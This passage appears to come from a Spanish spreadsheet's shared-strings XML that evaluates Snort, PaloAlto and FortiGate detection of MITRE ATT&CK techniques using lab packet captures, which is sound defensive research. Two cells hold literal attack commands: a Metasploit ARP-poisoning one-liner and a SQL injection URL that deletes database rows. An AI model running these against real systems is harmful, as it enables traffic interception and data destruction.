    <t>TFTP</t>
  </si>
  <si>
    <t>Servidor TFTP utilizando Iventoy</t>
  </si>
  <si>
    <t>Manual [5] /  4.3.2</t>
  </si>
  <si>
    <t>Manual [5] / C.11</t>
  </si>
  <si>
    <t>Manual [5] /  5.5.3</t>
  </si>
  <si>
    <t>El arranque mediante TFTP desde otro servidor TFTP siempre se considera como un ataque</t>
  </si>
  <si>
    <t>1444, 2008120, 2008119, 2008118</t>
  </si>
  <si>
    <t>1444, 50447, 24303, 46533, 2100527, 2002749, 2002752, 2101444, 2008120, 2008119, 2008118, 2006408, 2000418, 2011803, 2000419, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 omite 8 flujos ICMPv6 mientras que Snortv3 omite 4 (no tienen relevancia para el ataque). Entre estos flujos se encuentran algunos con la opción Hop-by-Hop que no son analizados por ninguna de las versiones</t>
    </r>
  </si>
  <si>
    <t>tftp -- file sharing</t>
  </si>
  <si>
    <t>9999, 31914</t>
  </si>
  <si>
    <t>PaloAlto detecta URLs como amenaza con URI relacionada con arranque por red PXE. Además, PaloAlto detecta el uso de TFTP. En conjunto con las alertas detectadas mediante IPS, podemos llegar a considerar que PaloAlto detecta un arranque TFTP que en determinados casos, es un TP</t>
  </si>
  <si>
    <t>Privilege Escalation</t>
  </si>
  <si>
    <t>Create or Modify System Process</t>
  </si>
  <si>
    <t>T1543</t>
  </si>
  <si>
    <t>Windows Service</t>
  </si>
  <si>
    <t>T1543.003</t>
  </si>
  <si>
    <t>Creación o modificación de servicio de Windows para garantizar la persistencia</t>
  </si>
  <si>
    <t>T1543.003-CreateSystemProcessWindowsService_[5].pcapng</t>
  </si>
  <si>
    <t>Crear servicio Windows para garantizar persistencia</t>
  </si>
  <si>
    <t>Manual [5] / 4.3.4</t>
  </si>
  <si>
    <t>Manual [5] / C.43</t>
  </si>
  <si>
    <t>Manual [5] / 5.5.6</t>
  </si>
  <si>
    <t>La creacion de un servicio de Windows puede considerarse como tráfico legítimo pero tambien como un ataque dependiendo. Esta accion podria realizarla un administrador de red o un atacante</t>
  </si>
  <si>
    <t>2035480, 2018959, 2025644</t>
  </si>
  <si>
    <t>2035480, 2018959</t>
  </si>
  <si>
    <t>2035480, 2018959, 2025644, 53331</t>
  </si>
  <si>
    <t>2035480, 2018959, 53331</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">503331, 2002752, 2002749, 2035480, 2018959, 2009080, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2000419</t>
    </r>
  </si>
  <si>
    <t>503331, 2002752, 2002749, 2035480, 2018959, 2009080, 2025644, 2000419</t>
  </si>
  <si>
    <t>503331, 2035480, 2018959, 2009080, 2000419</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>I</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>nstancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el ataque contiene un establecimiento de conexión previo mediante Metasploit, detectado por Snort. El ataque principal, sin embargo, no es detectado</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el establecimiento de la sesión con un shell remoto</t>
    </r>
  </si>
  <si>
    <t>Adversary-in-the-Middle</t>
  </si>
  <si>
    <t>T1557</t>
  </si>
  <si>
    <t>ARP Cache Poisoning</t>
  </si>
  <si>
    <t>T1557.002</t>
  </si>
  <si>
    <t>Suplantación ARP</t>
  </si>
  <si>
    <t>arpspoof</t>
  </si>
  <si>
    <t>T1557-Arp_spoof_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] / E.3</t>
  </si>
  <si>
    <t>Manual [5] / 5.7.3</t>
  </si>
  <si>
    <t>La suplantacion ARP siempre es un ataque</t>
  </si>
  <si>
    <t>29456, 384, 366, 408</t>
  </si>
  <si>
    <t>29456, 384, 366, 408, 2100366</t>
  </si>
  <si>
    <t>29456, 384, 366, 408, 2100469, 2100384, 2002752, 2002749, 2100366, 2100408</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza los dos flujos ICMP. Estos flujos no son relevantes para el ataque</t>
    </r>
  </si>
  <si>
    <t>DHCP Spoofing</t>
  </si>
  <si>
    <t>T1557.003</t>
  </si>
  <si>
    <t>DHCPig, servidor DHCP</t>
  </si>
  <si>
    <t>T1557-Dhcp_spoofing_[1].pcapng</t>
  </si>
  <si>
    <t xml:space="preserve">Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red </t>
  </si>
  <si>
    <t>Manual [1] /  2.4.2.1.2</t>
  </si>
  <si>
    <t>Manual [1] / E.19</t>
  </si>
  <si>
    <t>DHCP Spoof siempre se considera como un ataque</t>
  </si>
  <si>
    <t>2100527, 2002749, 2002752, 46533</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Contaje Mensajes</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: el CSV de alertas identifica paquetes distintos con el mismo IDPaq (porque el contenido de los paquetes es idéntico), causando que el cálculo devuelva menos mensajes que flujos. Se ha arreglado esta errata de forma manual (RS4: 2 mensajes → 147 mensajes)                                                 </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: hay dos flujos que no son TCP/UDP/ICMP. Uno es un flujo HPEXT y otro un flujo IGMP. El primero no es analizado por Snortv3 y Snortv2 y el segundo no es analizado por Snortv2. No son relevantes para el ataque.</t>
    </r>
  </si>
  <si>
    <t>Agujero 196</t>
  </si>
  <si>
    <t>ettercap</t>
  </si>
  <si>
    <t>T1557-Hole196_[1].pcapng</t>
  </si>
  <si>
    <t>Manual [1] /  2.1.2.1.1</t>
  </si>
  <si>
    <t>Manual [1] / E.28</t>
  </si>
  <si>
    <t>Un ataque de agujero 196 siempre se considera como un ataque</t>
  </si>
  <si>
    <t>2100366, 29456, 384, 366, 408</t>
  </si>
  <si>
    <t>29456, 384, 366, 408, 2100366, 2100384, 2002752, 2002749, 2100408</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza los dos flujos ICMP. Estos flujos no son relevantes para el ataque</t>
    </r>
  </si>
  <si>
    <t>Suplantación del puente raíz</t>
  </si>
  <si>
    <t>T1557-Puente_raiz_[1].pcapng</t>
  </si>
  <si>
    <t>Establecimiento de atacante como puente raíz</t>
  </si>
  <si>
    <t>Manual [1] /  2.1.4.1.2</t>
  </si>
  <si>
    <t>Manual [1] / E.6</t>
  </si>
  <si>
    <t>La suplantacion de un puente raiz siempre se considera como un ataque</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la diferencia entre los flujos de la captura y los flujos detectados por ambas versiones de Snort se debe a la naturaleza de los flujos. Éstos son flujos STP, HPEXT y ICMP, causando que no todos sean analizados (aunque puedan ser relevantes son flujos en su mayoría de capa 2, por lo que es previsible que no sean analizados)</t>
    </r>
  </si>
  <si>
    <t>Redirección</t>
  </si>
  <si>
    <t>ettercap, netwox</t>
  </si>
  <si>
    <t>T1557-Redireccion_[1].pcapng</t>
  </si>
  <si>
    <t xml:space="preserve">Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección </t>
  </si>
  <si>
    <t>Manual [1] /  2.2.2.1.3</t>
  </si>
  <si>
    <t>Manual [1] / E.8</t>
  </si>
  <si>
    <t>La dredireccion siempre se considera como un ataque</t>
  </si>
  <si>
    <t>29456, 384, 366, 408, 2100469, 2100472, 2100366, 2100384, 2002752, 2002749, 2100408</t>
  </si>
  <si>
    <t>Envenenamiento ARP</t>
  </si>
  <si>
    <t>Arpspoof</t>
  </si>
  <si>
    <t>T1557.002-ARP_poisoning1_[2].pcapng</t>
  </si>
  <si>
    <t>Envenenamiento de tablas ARP mediante Arpspoof.</t>
  </si>
  <si>
    <t>Manual [2] /  3.4.1.1</t>
  </si>
  <si>
    <t>Manual [5] / C.32</t>
  </si>
  <si>
    <t>El envenamiento ARP siempre es un ataque</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP. Este flujo no es relevante para el ataque</t>
    </r>
  </si>
  <si>
    <t>T1557.002-ARP_poisoning2_[3].pcapng</t>
  </si>
  <si>
    <t>Se realiza un ataque MITM, mediante el envenanamiento de las tablas de ARP caché de un equipo y su gateway. De esta toda se redirige todo el tráfico para que pase a través del equipo del atacante. Comando: msfconsole -x "use auxiliary/spoof/arp/arp_poisoning; set BIDIRECTIONAL true; set interface eth1; set DHOSTS 192.168.1.2; set SHOSTS 192.168.1.1; run -j -z; sleep 5; kill 0; exit"</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.19</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.19 y Manual [5] / C.33</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.19.5 y Manual [5] / 5.7.3</t>
  </si>
  <si>
    <t>Remote Service Session Hijacking</t>
  </si>
  <si>
    <t>T1563</t>
  </si>
  <si>
    <t>RDP Hijacking</t>
  </si>
  <si>
    <t>T1563.002</t>
  </si>
  <si>
    <t>Secuestro de sesión RDP mediante tscon.exe</t>
  </si>
  <si>
    <t>tscon.exe</t>
  </si>
  <si>
    <t>T1563.002-RDPHijacking_[5].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el intento de establecimiento de sesiones RDP poco convenciales, haciendo uso de los protocolos mínimos de seguridad.</t>
  </si>
  <si>
    <t>Uso de Windows Server 2012 R2 con DNS, Active Directory y Servicio de Escritorio Remoto</t>
  </si>
  <si>
    <t>Manual [5] /  4.7.1</t>
  </si>
  <si>
    <t>Manual [5] / C.12</t>
  </si>
  <si>
    <t>Manual [5] /  5.9.3</t>
  </si>
  <si>
    <t>El secuestro de una sesion RDP siempre se considera como un ataque</t>
  </si>
  <si>
    <t>1917, 1448</t>
  </si>
  <si>
    <t>1917, 1448, 2001330, 2027413</t>
  </si>
  <si>
    <t>1917, 1448, 2001330</t>
  </si>
  <si>
    <t>2001330, 2027413, 1917, 15935, 1448, 44486, 44484, 44488, 44487, 44485</t>
  </si>
  <si>
    <t>2001330, 1917, 15935, 1448, 44486, 44484, 44488, 44487, 44485</t>
  </si>
  <si>
    <t>1917, 15935, 1448, 44486, 44484, 44488, 44487, 44485, 2002752, 2002749, 2101620, 2101917, 2101448, 2101447, 2001329, 2001330, 2027413, 2003012, 2003020, 2001117, 2034857, 2044666</t>
  </si>
  <si>
    <t>1917, 15935, 1448, 44486, 44484, 44488, 44487, 44485, 2002752, 2002749, 2101620, 2101917, 2101448, 2101447, 2001329, 2001330, 2003012, 2003020, 2001117, 2044666</t>
  </si>
  <si>
    <t>2027413, 2034857</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la diferencia en los números de flujos detectados se debe a flujos ICMP no identificados por Snortv2 y a flujos de capa 2 identificados por tranalyzer (no relevantes para los resultados)</t>
    </r>
  </si>
  <si>
    <t>Data Manipulation</t>
  </si>
  <si>
    <t>T1565</t>
  </si>
  <si>
    <t>Stored Data Manipulation</t>
  </si>
  <si>
    <t>T1565.001</t>
  </si>
  <si>
    <t>T1565.001-SQL_inyection_[3].pcapng</t>
  </si>
  <si>
    <t>"El objetivo es generar daño en la BBDD. Queremos borrar lineas de una tabla. Comando: http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20DELETE%20FROM%20contactos%20WHERE%20num=3--"</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.8</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.8.4 y Manual [5] / C.34</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.8.5 y Manual [5] / 5.13.1</t>
  </si>
  <si>
    <t>50447, 2006443</t>
  </si>
  <si>
    <t>2002752, 2002749, 2006443, 50447</t>
  </si>
  <si>
    <t>Phishing</t>
  </si>
  <si>
    <t>T1566</t>
  </si>
  <si>
    <t>Spearphishing Attachment</t>
  </si>
  <si>
    <t>T1566.001</t>
  </si>
  <si>
    <t>Envío de emails con documentos maliciosos</t>
  </si>
  <si>
    <t>T1566.001-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Si los mensajes contienen determinados patrones como intentos de creación de Shells remotos sí que pueden ser detectados por los cortafuegos en base a reglas que detecten cadenas específicas en los paquetes</t>
  </si>
  <si>
    <t>Manual [5] /  5.3.5</t>
  </si>
  <si>
    <t>En general, el envio de documentos por email puede verse como tráfico legitimo pero dependiendo de las circunstancias puede ser un ataque</t>
  </si>
  <si>
    <t>1292, 46983</t>
  </si>
  <si>
    <t>1292, 46983, 47398</t>
  </si>
  <si>
    <t>1292, 46983,47398</t>
  </si>
  <si>
    <t>1292, 2002749, 2002752, 2101292, 46983, 47398</t>
  </si>
  <si>
    <t>1292, 2101292, 46983, 47398</t>
  </si>
  <si>
    <t>1292, 2101292, 2002752, 2002749</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la explicación a la diferencia entre los flujos detectados por Snortv2 (2) y Snortv3 (9) es sencilla. Atendiendo a puertos y direcciones tan sólo hay 2 flujos distintos, la clave está en que estas sesiones TCP que conforman los flujos se cierran y se vuelven a abrir, lo que causa que Snortv3 y tranalyzer lo consideren como nuevos flujos, no así Snortv2. Los resultados no se ven afectados.</t>
    </r>
  </si>
  <si>
    <t>29247, 12449</t>
  </si>
  <si>
    <t>32296, 54790</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> Las alertas detectadas se corresponden al establecimiento de una sesión posterior al phishing</t>
    </r>
  </si>
  <si>
    <t>Spearphishing Link</t>
  </si>
  <si>
    <t>T1566.002</t>
  </si>
  <si>
    <t>Obtener un acceso inicial mediante ingeniería social utilizando un enlace adjunto en un correo que descargue un fichero que establezca una sesión al equipo víctima</t>
  </si>
  <si>
    <t>SEToolKit, Metasploit</t>
  </si>
  <si>
    <t>T1566.002-Spearphishing_Link_[5].pcapng</t>
  </si>
  <si>
    <t>Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos que contengan contenido malware</t>
  </si>
  <si>
    <t>Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot</t>
  </si>
  <si>
    <t>Manual [5] /  4.2.2</t>
  </si>
  <si>
    <t>Manual [5] / C.13</t>
  </si>
  <si>
    <t>2043343, 2044076, 2016141, 2021076, 2018959, 2025644</t>
  </si>
  <si>
    <t>2043343, 2044076, 2016141, 2021076, 2018959, 2025644, 15935, 59597, 50447</t>
  </si>
  <si>
    <t>2043343, 2044076, 2016141, 2021076, 2018959, 2025644, 59597</t>
  </si>
  <si>
    <t>50447, 15935</t>
  </si>
  <si>
    <t xml:space="preserve">15935, 59597, 50447, 2043343, 2044076, 2002752, 2002749, 2001117, 2016141, 2003595, 2021076, 2018959, 2025644, 2101200, 2101620
</t>
  </si>
  <si>
    <t xml:space="preserve">15935, 59597, 50447, 2043343, 2044076, 2016141, 2003595, 2021076, 2018959, 2025644, 2101200
</t>
  </si>
  <si>
    <t xml:space="preserve">59597, 2043343, 2044076, 2016141, 2003595, 2021076, 2018959, 2025644
</t>
  </si>
  <si>
    <t>50447, 15935, 2002752, 2002749, 2001117, 2101200, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP, que es el que falta para alcanzar los 170 flujos totales de la captura</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">86533, 54752, 39909, </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="7"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>599800, 52020</t>
    </r>
  </si>
  <si>
    <t>86533, 54752, 39909, 599800, 52020</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Ataques colaterales:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> Paloalto detecta un shell de comandos mediante TCP, lo cual es el acceso inicial realizado por el atacante posterior al phishing. Los flujos detectados como ataque colateral no cuentan para el análisis de detecciones</t>
    </r>
  </si>
  <si>
    <t>Exfiltration over Web Service</t>
  </si>
  <si>
    <t>T1567</t>
  </si>
  <si>
    <t>Exfiltration to Cloud Storage</t>
  </si>
  <si>
    <t>T1567.002</t>
  </si>
  <si>
    <t>Exfiltrar datos de un equipo a la nube</t>
  </si>
  <si>
    <t>Google Drive</t>
  </si>
  <si>
    <t>T1567.002-Exfiltration_To_Cloud_Storage_[5].pcapng</t>
  </si>
  <si>
    <t>Transferir ficheros de un equipo a la nube</t>
  </si>
  <si>
    <t>Manual [5] /  4.9.3</t>
  </si>
  <si>
    <t>Manual [5] / C.14</t>
  </si>
  <si>
    <t>Manual [5] /  5.12.8</t>
  </si>
  <si>
    <t>La exfiltracion de datos a la nube puede considerarse como una actividad legítima en determinados casos. Sin embargo, tambien puede ser una manera de ataque</t>
  </si>
  <si>
    <t>42533, 38131</t>
  </si>
  <si>
    <t>google-drive-web-base -- file sharing</t>
  </si>
  <si>
    <t>Dynamic Resolution</t>
  </si>
  <si>
    <t>T1568</t>
  </si>
  <si>
    <t>Fast Flux DNS</t>
  </si>
  <si>
    <t>T1568.001</t>
  </si>
  <si>
    <t>Esconder un C2 Server mediante un servidor DNS con bajo TTL y modo Fast Flux</t>
  </si>
  <si>
    <t>bind, Metasploit</t>
  </si>
  <si>
    <t>T1568-fastFluxDNS_[5].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte una respuesta DNS que devuelva varias direcciones IP. Es decir, detecta el comportamiento de un DNS Round Robin</t>
  </si>
  <si>
    <t>Servidor DNS "Round Robin"</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.4</t>
  </si>
  <si>
    <t>Manual [5] / C.15</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.10</t>
  </si>
  <si>
    <t>El ataque del pcap permuta entre 2 IPs de servidores DNS. En algunos entornos, esto puede ser un funcionamiento legítimo</t>
  </si>
  <si>
    <t>366, 29456, 384, 408, 2100366, 57756, 15935</t>
  </si>
  <si>
    <t>366, 29456, 384, 408, 2100366, 15935</t>
  </si>
  <si>
    <t>366, 29456, 384, 408, 57756, 15935 2002752, 2002749, 2100366, 2100384, 2100408, 2101620</t>
  </si>
  <si>
    <t>366, 29456, 384, 408, 15935 2002752, 2002749, 2100366, 2100384, 2100408, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no detecta tres flujos ICMP (irrelevantes para el ataque)</t>
    </r>
  </si>
  <si>
    <t>PaloAlto detecta como amenaza con SID 9999 las URLs correspondientes a la sesión C2 utilizando el dominio con Fast Flux. Sin embargo, no detecta que se esté utilizando el fast flux en si. Mediante esta alerta podría considerarse el ataque revisando las direcciones IP destino correspondientes a la alerta y que todas se dirigen a un mismo dominio que varía la IP. Sin embargo, esta alerta se considera FP porque no detecta claramente el ataque</t>
  </si>
  <si>
    <t>System Services</t>
  </si>
  <si>
    <t>T1569</t>
  </si>
  <si>
    <t>Service Execution</t>
  </si>
  <si>
    <t>T1569.002</t>
  </si>
  <si>
    <t>Ejecución de un Servicio / Fichero Ejecutable de manera remota</t>
  </si>
  <si>
    <t>PsExec</t>
  </si>
  <si>
    <t>T1569-System_services_service_execution_[4].pcapng</t>
  </si>
  <si>
    <t>SVCCTL</t>
  </si>
  <si>
    <t xml:space="preserve">Existen múltiples métodos de detección. Como ejemplos:
        Regla que detecte la cadena “PSEXESVC” en el contenido de mensajes SMBv2
        Regla que detecte archivos ejecutables en mensajes SMB
</t>
  </si>
  <si>
    <t>Manual [4] /  3.6</t>
  </si>
  <si>
    <t>Manual [4] / B.6</t>
  </si>
  <si>
    <t>Manual [4] / 4.6</t>
  </si>
  <si>
    <t>La creación de un servicio o proceso de forma remota es legítima cuando el usuario permite o autoriza dicho movimiento</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF434343"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">459, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF434343"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2010781</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF434343"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 2025701, 2025699, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF434343"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027237</t>
    </r>
  </si>
  <si>
    <t>2025701, 2025699</t>
  </si>
  <si>
    <t>2025701, 2025699, 459</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2010781</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027237</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">459, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2010781</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 2025701, 2025699, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027237</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 44489, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>30281</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 26385</t>
    </r>
  </si>
  <si>
    <t>459, 44489, 2025701, 2025699, 26385</t>
  </si>
  <si>
    <t>2025701, 2025699, 26385</t>
  </si>
  <si>
    <t>459, 44489</t>
  </si>
  <si>
    <t>2010781, 2027237, 30281</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">459, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2010781</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 2025701, 2025699, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2027237</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">. 44489, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>30281</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 26385, 2101620, 2100459, 2044666, 2051116, 2024510, 2002752, 2002749, 2027191</t>
    </r>
  </si>
  <si>
    <t>26385, 2025701, 2024510</t>
  </si>
  <si>
    <t>459, 44489, 2002752, 2002749, 2101620, 2100459, 2044666, 2051116, 2025669</t>
  </si>
  <si>
    <t>30281, 2010781, 2027237</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no identifica los flujos ICMP (aunque sí los analiza)</t>
    </r>
  </si>
  <si>
    <t>25853, 52166</t>
  </si>
  <si>
    <t>92322, 36540</t>
  </si>
  <si>
    <t>Lateral Tool Transfer</t>
  </si>
  <si>
    <t>T1570</t>
  </si>
  <si>
    <t>Transferencia de herramientas para la continuación del ataque entre máquinas utilizando protocolos de compartición de archivos</t>
  </si>
  <si>
    <t>T1570-Lateral_Tool_Transfer_[5].pcapng</t>
  </si>
  <si>
    <t>Ejecución de comandos de forma remota (no constituyen el ataque en sí) -  T1059</t>
  </si>
  <si>
